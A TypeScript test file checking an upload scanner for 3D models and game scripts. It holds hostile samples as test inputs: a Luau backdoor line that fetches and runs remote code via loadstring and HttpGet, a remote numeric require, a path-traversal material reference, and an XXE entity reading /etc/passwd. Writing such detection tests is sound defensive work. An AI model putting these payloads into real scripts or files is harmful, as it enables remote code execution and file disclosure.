import { describe, it, expect } from 'vitest';
import { inspectUpload, MAX_SCAN_BYTES } from '@/lib/upload-inspection';
const bytes = (s: string) => new TextEncoder().encode(s);
describe('model and script upload checks', () => {
  it('accepts only self-contained mesh OBJ', () => {
    expect(inspectUpload('triangle.obj', bytes('v 0 0 0\nv 1 0 0\nv 0 1 0\nf 1 2 3')).status).toBe('checked');
    expect(inspectUpload('bad.obj', bytes('v 0 0 0\nf 1 2 999')).status).toBe('rejected');
  });
  it('keeps OBJ dependencies private', () => {
    expect(inspectUpload('model.obj', bytes('mtllib ../../payload.mtl\nv 0 0 0')).status).toBe('review_required');
  });
  it('flags backdoor patterns and never approves executable scripts', () => {
    const r = inspectUpload('backdoor.luau', bytes('require(123456); loadstring(game:HttpGet("https://example.com"))()'));
    expect(r.status).toBe('review_required');
    expect(r.findings).toContain('Remote numeric require dependency');
    expect(r.findings).toContain('Dynamic execution or environment manipulation');
    expect(inspectUpload('plain.lua', bytes('print("hello")')).status).toBe('review_required');
  });
  it('blocks active executable formats and XML entities', () => {
    expect(inspectUpload('payload.exe', bytes('MZ')).status).toBe('rejected');
    expect(inspectUpload('model.rbxmx', bytes('<!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]>')).status).toBe('rejected');
  });
  it('does not approve opaque binary models or archives', () => {
    expect(inspectUpload('model.rbxm', bytes('<roblox!binary')).status).toBe('review_required');
    expect(inspectUpload('models.zip', bytes('PK')).status).toBe('review_required');
    expect(inspectUpload('fake.glb', bytes('not a valid GLB header at all')).status).toBe('rejected');
  });
  it('enforces the 50 MB inspection limit', () => {
    expect(MAX_SCAN_BYTES).toBe(52428800);
    expect(inspectUpload('model.obj', new Uint8Array(MAX_SCAN_BYTES + 1)).status).toBe('rejected');
  });
});